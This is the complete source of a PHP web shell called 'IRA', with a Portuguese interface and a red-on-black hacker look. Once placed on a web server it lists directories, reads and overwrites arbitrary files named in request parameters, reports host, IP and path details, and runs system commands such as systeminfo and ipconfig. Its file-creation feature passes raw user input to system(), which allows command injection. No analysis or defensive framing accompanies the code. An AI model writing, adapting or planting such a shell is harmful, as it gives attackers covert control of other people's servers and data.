<?php
error_reporting(0);
ini_set("display_error",0);
set_time_limit(0);
function diretorio($path){
	$diretorio = dir($path);
	return $diretorio;
	return $path;
}
function nul($nome){
	$cmd = "NUL > ".$nome;
	system($cmd);
}
function _touch($nome){
	$cmd = "touch ".$nome;
	system($cmd);
}
function editar($conteudo,$arquivo){
	$fp = fopen($arquivo, "w");
	$escrever = fwrite($fp, $conteudo);
}
?>
<!DOCTYPE html>
	<head>
		<title>>IRA<</title>
		<meta charset="UTF-8">
		<meta name="author" content="Cooldsec">
		<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
		<style>
		*{ 			font-family: 'Press Start 2P', cursive; 			text-decoration:none; 			font-size:10px; 		} 		body { 			background: #000; 			color:#ff0000; 		} 		#conteudo { 			margin:0 auto; 			width:1000px; 		} 		 		#menu { 			display:inline; 		} 		 		#menu ul li { 			list-style:none; 			float:left; 		} 		 		#menu ul li a { 			padding:30px; 		}
		</style>
	</head>
	<body>
		<div id="conteudo">
			<font color="red" size=1><?php echo $_SERVER['HTTP_USER_AGENT']; ?></font><br><br>
			<font color="red" size=1>Server IP: </font><font color='white'><?php echo gethostname(); ?></font><br><br>
			<font color="red" size=1>Seu IP: </font><font color='white'><?php echo $_SERVER['REMOTE_ADDR']; ?></font><br><br>
			<font color="red" size=1>Path: </font><font color='white'><?php echo $_SERVER['DOCUMENT_ROOT']; ?></font><br><br>
			<hr color="red">
			<div id="menu">
				<ul>
					<li><a href="?cmd=systeminfo">System INFO</a>
					<li><a href="?cmd=rede">Rede</a>
				</ul>
			</div><br>
			<hr color="red"><br>
				<form method="GET" action="">
					Acessar Diretorio: <input type="text" name="dir" value="<?php echo $_SERVER['DOCUMENT_ROOT']; ?>">
				</form><br><br>
				<?php
					if($_POST['nul']){
							  if(nul($_POST['nul'])){
								echo "<script>alert('Arquivo criado!')</script>";
							} else {
								echo "<script>alert('Erro ao criar!')</script>";
						}
					}
					
					if($_GET['dir']){
							$dir = diretorio($_GET['dir']);
							echo "Listando '<strong>".$dir->path."</strong>':<br><br>";
								while($arquivo = $dir->read()){
									echo "<a class='dir' href='?file=".$arquivo."'>  =>  ".$arquivo."</a><br><br>";
								}
							$dir -> close();
					}
					
					if($_POST['editar']){
						if(editar($_POST['editar'], $_GET['file'])){
							echo "<script>alert('Salvo!')</script>";
						}
					}
					if($_GET['cmd'] == "systeminfo"){
						echo "<pre>".system('systeminfo')."</pre>";
					}
					if($_GET['cmd'] == "rede"){
						echo "<pre>".system('ipconfig')."</pre>";
					}
					if($_GET['file']){
					$arquivo = $_GET['file'];
					$ler = file_get_contents($arquivo);
						echo "Editando o arquivo: <font color='white'>".$_SERVER['PATH_INFO']."/".$arquivo."</font><br><br><br>";
						echo "<form method='post' action=''><textarea name='editar' cols=100 rows=30>$ler</textarea><br><br><br>";
						echo "<input type='submit' value='Salvar'>
						<a href='javascript:history.back'><button>Voltar</button></a></form>";
					}
				?>
				<br><br><br><hr color="red"><br><br>
				<form method="post" action="">
					Criar arquivo: <input type="text" name="nul">
				</form><br><br><br>
		</div>
	</body>
</html>
